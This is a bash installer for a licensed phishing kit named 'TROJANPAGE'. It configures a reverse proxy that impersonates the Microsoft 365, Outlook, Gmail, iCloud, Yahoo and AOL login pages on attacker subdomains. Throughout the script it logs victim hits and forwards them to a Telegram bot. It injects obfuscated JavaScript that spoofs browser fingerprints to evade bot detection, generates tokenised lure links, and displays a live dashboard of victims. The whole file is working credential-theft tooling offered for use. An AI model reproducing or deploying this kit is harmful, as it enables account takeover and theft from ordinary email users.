#!/bin/bash
# 🏛️ TROJANPAGE - VISUAL MONITOR EDITION (V14.9.6)
# --------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

# --- 1. SYSTEM PRE-FLIGHT ---
show_header
DEPS=(curl dig php screen node npm jq)
for dep in "${DEPS[@]}"; do
    if ! command -v $dep &> /dev/null; then
        sudo apt-get update -y && sudo apt-get install -y curl dnsutils php-cli screen nodejs npm jq
    fi
done
if ! command -v javascript-obfuscator &> /dev/null; then
    npm install -g javascript-obfuscator &> /dev/null
fi

# --- 2. STORAGE PREP ---
mkdir -p /root/db/
mkdir -p /var/www/adobe_gui/js/
touch /root/db/used_tokens.txt
touch /root/hits.json
chmod 777 /root/db/used_tokens.txt
VPS_IP=$(curl -s https://api.ipify.org)

# --- 3. MASTER LICENSE CHECK ---
MASTER_KEY="TROJAN-PRO-2026"
show_header
read -p "ENTER MASTER LICENSE KEY: " USER_KEY
[[ $(echo "$USER_KEY" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[!] ACCESS DENIED${NC}"; exit 1; }

# --- 4. REGIONAL EXIT (SOCKS5) ---
echo -e "${YELLOW}»» SOCKS5 EXIT CONFIGURATION${NC}"
read -p "Enable SOCKS5 Exit? (y/n): " PROXY_ENABLE
if [[ "$PROXY_ENABLE" == "y" ]]; then
    read -p "Enter SOCKS5 (ip:port:user:pass): " SOCKS_URL
else
    SOCKS_URL="direct"
fi

# --- 5. VALIDATIONS ---
while true; do
    read -p "Enter Telegram Bot Token: " TG_TOKEN
    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then break; else echo -e "${RED}Invalid Bot.${NC}"; fi
done
read -p "Enter Telegram Chat ID: " TG_ID

while true; do
    read -p "Enter Cloudflare API Token: " CF_TOKEN
    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" -H "Authorization: Bearer $CF_TOKEN")
    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then break; else echo -e "${RED}CF Token Rejected.${NC}"; fi
done

while true; do
    read -p "Enter Base Domain: " USER_DOMAIN
    USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
    DNS_RESOLVE=$(dig +short "*.$USER_DOMAIN" | tail -n1)
    if [[ "$DNS_RESOLVE" == "$VPS_IP" ]]; then break; else echo -e "${RED}DNS Mismatch! Points to [$DNS_RESOLVE].${NC}"; fi
done

read -p "Enter Path Slug: /" USER_SLUG
CLEAN_SLUG=$(echo "$USER_SLUG" | tr -dc 'a-zA-Z0-9')

# --- 6. AKAMAI TELEMETRY + OBFUSCATOR ---
cat << 'EOF' > /tmp/raw_telemetry.js
(function() {
    setTimeout(function() {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        const getParameter = WebGLRenderingContext.prototype.getParameter;
        WebGLRenderingContext.prototype.getParameter = function(parameter) {
            if (parameter === 37445) return 'Intel Inc.';
            if (parameter === 37446) return 'Intel(R) Iris(TM) Graphics 6100';
            return getParameter.apply(this, arguments);
        };
    }, 2000);
})();
EOF
javascript-obfuscator /tmp/raw_telemetry.js --output /var/www/adobe_gui/js/akamai_fingerprint.js --compact true --self-defending true --string-array true --string-array-encoding 'base64' --string-array-threshold 1
rm /tmp/raw_telemetry.js

# --- 7. CONFIG DEPLOYMENT ---
cat << EOF > /root/config.json
{
  "proxyDomain": "$USER_DOMAIN",
  "listeningAddress": "0.0.0.0",
  "listeningPortHTTPS": 443,
  "listeningPortHTTP": 8080,
  "target": "login.microsoftonline.com",
  "log": "/root/hits.json",
  "telegramToken": "$TG_TOKEN",
  "telegramChatId": "$TG_ID",
  "cfToken": "$CF_TOKEN",
  "injectJs": "/var/www/adobe_gui/js/akamai_fingerprint.js",
  "proxyExit": "$SOCKS_URL",
  "headerRules": [ { "name": "X-Akamai-Edge", "value": "true" } ],
  "proxyRules": [
    {"hostname": "*.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.office.$USER_DOMAIN", "target": "login.microsoftonline.com", "type": "proxy"},
    {"hostname": "*.outlook.$USER_DOMAIN", "target": "outlook.live.com", "type": "proxy"},
    {"hostname": "*.gmail.$USER_DOMAIN", "target": "accounts.google.com", "type": "proxy"},
    {"hostname": "*.icloud.$USER_DOMAIN", "target": "www.icloud.com", "type": "proxy"},
    {"hostname": "*.yahoo.$USER_DOMAIN", "target": "login.yahoo.com", "type": "proxy"},
    {"hostname": "*.aol.$USER_DOMAIN", "target": "login.aol.com", "type": "proxy"}
  ]
}
EOF

# --- 8. DASHBOARD WITH BEAUTIFIED TABLE ---
cat << 'EOF' > /root/run.sh
#!/bin/bash
RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'
CONFIG="/root/config.json"
DOMAIN=$(grep -oP '(?<="proxyDomain": ")[^"]*' $CONFIG)
SLUG=$(echo "$USER_SLUG") 
MASK=$(tr -dc '0-9' < /dev/urandom | head -c 10)
TOKEN=$(tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c 8)

show_header() {
    clear
    echo -e "${BLUE}  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
    echo -e "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
    echo -e "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
    echo -e "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
    echo -e "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
    echo -e "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝${NC}"
}

show_header
echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}COMPLETE GHOST TERMINAL${NC} | ${PURPLE}TARGETS:${NC} 06 | ${GREEN}STATUS: ONLINE${NC}      ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC} 01 | Office365 | https://$DOMAIN/s/?id=office&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 02 | Outlook   | https://$DOMAIN/s/?id=outlook&m=$MASK&s=$SLUG&t=$TOKEN ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 03 | Gmail     | https://$DOMAIN/s/?id=gmail&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 04 | iCloud    | https://$DOMAIN/s/?id=icloud&m=$MASK&s=$SLUG&t=$TOKEN  ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 05 | Yahoo     | https://$DOMAIN/s/?id=yahoo&m=$MASK&s=$SLUG&t=$TOKEN   ${BLUE}║${NC}"
echo -e "${BLUE}║${NC} 06 | AOL       | https://$DOMAIN/s/?id=aol&m=$MASK&s=$SLUG&t=$TOKEN     ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}               ${YELLOW}LIVE ACTIVITY MONITOR (RECENT HITS)${NC}                ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║${NC}  ${CYAN}TIME${NC}       |  ${CYAN}TARGET${NC}   |  ${CYAN}IP ADDRESS${NC}      |  ${CYAN}COUNTRY${NC}        ${BLUE}║${NC}"
echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════╣${NC}"

# Result Formatting Logic
tail -n 5 /root/hits.json | jq -r '"║ \(.timestamp) | \(.target | ascii_upcase | .[0:8]) | \(.ip | .[0:15]) | \(.country | .[0:12]) ║"' 2>/dev/null || echo -e "${BLUE}║${NC}        No activity detected yet. Waiting for lures...         ${BLUE}║${NC}"

echo -e "${BLUE}╚══════════════════════════════════════════════════════════════════╝${NC}"

sudo fuser -k 80/tcp 443/tcp 2>/dev/null
pkill -9 proxy
screen -dmS lure php -S 0.0.0.0:80 -t /var/www/adobe_gui/
cd /root/engine/dist/ && ./proxy -config "$CONFIG"
EOF

chmod +x /root/run.sh
sudo ln -sf /root/run.sh /usr/local/bin/Run
echo -e "${GREEN}[success] Visual Panel & Targets Ready. Type 'Run'.${NC}"
